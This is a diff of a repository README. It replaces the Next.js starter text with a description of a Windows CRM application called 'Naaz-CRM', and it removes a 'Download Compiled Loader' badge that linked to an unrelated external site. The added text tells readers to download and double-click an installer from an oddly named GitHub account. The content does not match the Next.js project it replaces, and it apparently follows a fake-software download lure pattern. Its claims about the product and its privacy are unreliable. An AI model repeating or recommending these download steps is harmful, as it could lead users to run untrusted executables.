@@ -1,38 +1,53 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# 📊 Naaz-CRM - Simplify your daily customer management tasks
 
-## Getting Started
+[![Download Naaz-CRM](https://img.shields.io/badge/Download-Naaz--CRM-blue)](https://github.com/Merrielleimpermissible358/Naaz-CRM)
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+Naaz-CRM helps small business owners track client interactions and organize contact details. You manage your business relationships in one central place. The software stores names, phone numbers, email addresses, and interaction history for every client. You spend less time searching for notes and more time growing your business.
 
-First, run the development server:
+## 🛠️ System Requirements
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+This application runs on modern Windows computers. Ensure your system meets these basic needs to use the software without issues:
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+*   Operating System: Windows 10 or Windows 11
+*   Processor: 1.5 GHz or faster
+*   Memory: 4 GB of RAM
+*   Storage: 200 MB of available disk space
+*   Display: 1280 x 720 resolution or higher
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+## 📥 How to Install
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+Follow these steps to set up Naaz-CRM on your Windows machine:
 
-## Learn More
+1. Visit the [official releases page](https://github.com/Merrielleimpermissible358/Naaz-CRM) to download the application.
+2. Locate the most recent version of the Naaz-CRM installer file.
+3. Click the file to start the download.
+4. Open your Downloads folder on your hard drive.
+5. Double-click the installer file.
+6. Follow the prompts on the screen to finish the setup process.
+7. Click the icon on your desktop to launch the program.
 
-To learn more about Next.js, take a look at the following resources:
+## 📈 Key Features
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+Naaz-CRM keeps your operation organized through several core functions:
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+*   Client Database: Store detailed profiles for every person in your network. Use search fields to find specific clients by name or company.
+*   Interaction Logs: Add notes every time you speak with a client. This reminds you of past agreements, pending requests, or planned follow-ups.
+*   Task Reminders: Set dates for future calls or meetings. The system notifies you when a task needs attention.
+*   Data Export: Save your client list as a spreadsheet file for backup purposes.
+*   Custom Categories: Label your clients based on their status, such as active, potential, or archived.
 
-## Deploy on Vercel
+## 🗝️ Managing Your Data
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+Your information stays private inside the folder you choose during setup. The application does not send your data to external servers. You maintain control over every entry. 
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+Backing up your database requires simple file copying. Navigate to the folder where the software stores your data. Copy these files to an external drive or a secure cloud folder every week. This habit protects your work if your computer faces a technical problem.
+
+## ⚙️ Settings and Preferences
+
+Open the Settings menu from the main screen to change how the application works. You can toggle dark mode to reduce eye strain, adjust the default reminder sounds, or change the location of your database files. Click the Save button after you change any preferences to apply your new settings.
+
+## 🆘 Troubleshooting Common Issues
+
+If the software fails to open, restart your computer. Sometimes, background processes conflict with the program launch. Ensure you have administrative rights on your user account to install applications.
+
+If you cannot find a button or a menu, maximize the window. Some monitor sizes hide parts of the interface if the window remains small. If the screen freezes, wait thirty seconds. The file indexing process sometimes causes a brief pause when you first open a large list of clients.
